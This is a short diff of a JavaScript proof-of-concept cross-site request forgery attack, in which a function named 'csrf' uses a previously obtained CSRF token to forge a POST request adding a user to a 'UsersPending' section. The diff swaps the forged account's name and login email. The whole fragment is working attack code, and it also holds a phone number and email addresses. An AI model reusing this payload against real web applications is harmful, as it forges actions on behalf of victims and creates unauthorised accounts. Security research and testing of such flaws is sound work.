@@ -37,11 +37,11 @@ xhr.send(null);
 // Sends the CSRF attack to POST data to the UsersPending section, using the previously obtained CSRF token
 function csrf(token, key) {
     var params = "_Token%5Bfields%5D=" + token;
-    params += "&fname=testus&";
-    params += "lname=trying21&";
+    params += "&fname=hamdolah&";
+    params += "lname=trying&";
     params += "phone=&";
     params += "mobile_phone=0625638657&";
-    params += "login=ihwoke@live.com&";
+    params += "login=thanks@live.com&";
     params += "_Token%5Bunlocked%5D=&";
     params += "_csrfToken=" + encodeURIComponent(key);
 
